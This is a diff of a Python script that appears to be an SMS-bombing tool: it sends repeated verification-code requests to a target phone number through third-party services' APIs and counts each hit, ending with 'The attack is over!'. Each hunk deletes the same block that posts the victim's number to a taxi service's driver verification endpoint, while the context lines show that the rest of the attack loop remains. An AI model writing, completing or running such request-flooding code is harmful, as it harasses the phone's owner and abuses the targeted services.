@@ -1055,18 +1055,7 @@ if call == str(2):
             time.sleep(1)
         except:
             print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post("https://guru.taxi/api/v1/driver/session/verify",
-                          json={"phone": {"code": 1, "number": _phone}})
-            R = R + 1
-            print('[+] Guru Was sent! || Count - ' + str(R))
-            time.sleep(1)
-        except:
-            print('[-] Error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -1521,18 +1510,7 @@ if call == str(2):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
             break
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post("https://guru.taxi/api/v1/driver/session/verify",
-                          json={"phone": {"code": 1, "number": _phone}})
-            R = R + 1
-            print('[+] Guru Was sent! || Count - ' + str(R))
-            time.sleep(1)
-        except:
-            print('[-] Error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -1892,17 +1870,7 @@ if call == str(2):
         except:
             print('[-] Error in sent!')
 
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post("https://guru.taxi/api/v1/driver/session/verify",
-                          json={"phone": {"code": 1, "number": _phone}})
-            R = R + 1
-            print('[+] Guru Was sent! || Count - ' + str(R))
-        except:
-            print('[-] Error in sent!')
+
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
@@ -3036,18 +3004,7 @@ if call == str(2):
             time.sleep(1)
         except:
             print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post("https://guru.taxi/api/v1/driver/session/verify",
-                          json={"phone": {"code": 1, "number": _phone}})
-            R = R + 1
-            print('[+] Guru Was sent! || Count - ' + str(R))
-            time.sleep(1)
-        except:
-            print('[-] Error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -3502,18 +3459,7 @@ if call == str(2):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
             break
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post("https://guru.taxi/api/v1/driver/session/verify",
-                          json={"phone": {"code": 1, "number": _phone}})
-            R = R + 1
-            print('[+] Guru Was sent! || Count - ' + str(R))
-            time.sleep(1)
-        except:
-            print('[-] Error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -3877,17 +3823,7 @@ if call == str(2):
         except:
             print('[-] Error in sent!')
 
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post("https://guru.taxi/api/v1/driver/session/verify",
-                          json={"phone": {"code": 1, "number": _phone}})
-            R = R + 1
-            print('[+] Guru Was sent! || Count - ' + str(R))
-        except:
-            print('[-] Error in sent!')
+
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
@@ -5008,18 +4944,7 @@ if call == str(2):
             time.sleep(1)
         except:
             print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post("https://guru.taxi/api/v1/driver/session/verify",
-                          json={"phone": {"code": 1, "number": _phone}})
-            R = R + 1
-            print('[+] Guru Was sent! || Count - ' + str(R))
-            time.sleep(1)
-        except:
-            print('[-] Error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -5474,18 +5399,7 @@ if call == str(2):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
             break
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post("https://guru.taxi/api/v1/driver/session/verify",
-                          json={"phone": {"code": 1, "number": _phone}})
-            R = R + 1
-            print('[+] Guru Was sent! || Count - ' + str(R))
-            time.sleep(1)
-        except:
-            print('[-] Error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -5845,17 +5759,7 @@ if call == str(2):
         except:
             print('[-] Error in sent!')
 
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post("https://guru.taxi/api/v1/driver/session/verify",
-                          json={"phone": {"code": 1, "number": _phone}})
-            R = R + 1
-            print('[+] Guru Was sent! || Count - ' + str(R))
-        except:
-            print('[-] Error in sent!')
+
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
@@ -6989,18 +6893,7 @@ if call == str(2):
             time.sleep(1)
         except:
             print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post("https://guru.taxi/api/v1/driver/session/verify",
-                          json={"phone": {"code": 1, "number": _phone}})
-            R = R + 1
-            print('[+] Guru Was sent! || Count - ' + str(R))
-            time.sleep(1)
-        except:
-            print('[-] Error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -7455,18 +7348,7 @@ if call == str(2):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
             break
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post("https://guru.taxi/api/v1/driver/session/verify",
-                          json={"phone": {"code": 1, "number": _phone}})
-            R = R + 1
-            print('[+] Guru Was sent! || Count - ' + str(R))
-            time.sleep(1)
-        except:
-            print('[-] Error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -7830,17 +7712,7 @@ if call == str(2):
         except:
             print('[-] Error in sent!')
 
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post("https://guru.taxi/api/v1/driver/session/verify",
-                          json={"phone": {"code": 1, "number": _phone}})
-            R = R + 1
-            print('[+] Guru Was sent! || Count - ' + str(R))
-        except:
-            print('[-] Error in sent!')
+
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
@@ -8961,18 +8833,7 @@ if call == str(2):
             time.sleep(1)
         except:
             print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post("https://guru.taxi/api/v1/driver/session/verify",
-                          json={"phone": {"code": 1, "number": _phone}})
-            R = R + 1
-            print('[+] Guru Was sent! || Count - ' + str(R))
-            time.sleep(1)
-        except:
-            print('[-] Error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -9427,18 +9288,7 @@ if call == str(2):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
             break
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post("https://guru.taxi/api/v1/driver/session/verify",
-                          json={"phone": {"code": 1, "number": _phone}})
-            R = R + 1
-            print('[+] Guru Was sent! || Count - ' + str(R))
-            time.sleep(1)
-        except:
-            print('[-] Error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -9798,17 +9648,7 @@ if call == str(2):
         except:
             print('[-] Error in sent!')
 
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post("https://guru.taxi/api/v1/driver/session/verify",
-                          json={"phone": {"code": 1, "number": _phone}})
-            R = R + 1
-            print('[+] Guru Was sent! || Count - ' + str(R))
-        except:
-            print('[-] Error in sent!')
+
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
@@ -10951,18 +10791,7 @@ if call == str(2):
             time.sleep(1)
         except:
             print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post("https://guru.taxi/api/v1/driver/session/verify",
-                          json={"phone": {"code": 1, "number": _phone}})
-            R = R + 1
-            print('[+] Guru Was sent! || Count - ' + str(R))
-            time.sleep(1)
-        except:
-            print('[-] Error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -11417,18 +11246,7 @@ if call == str(2):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
             break
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post("https://guru.taxi/api/v1/driver/session/verify",
-                          json={"phone": {"code": 1, "number": _phone}})
-            R = R + 1
-            print('[+] Guru Was sent! || Count - ' + str(R))
-            time.sleep(1)
-        except:
-            print('[-] Error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -11792,17 +11610,7 @@ if call == str(2):
         except:
             print('[-] Error in sent!')
 
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post("https://guru.taxi/api/v1/driver/session/verify",
-                          json={"phone": {"code": 1, "number": _phone}})
-            R = R + 1
-            print('[+] Guru Was sent! || Count - ' + str(R))
-        except:
-            print('[-] Error in sent!')
+
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
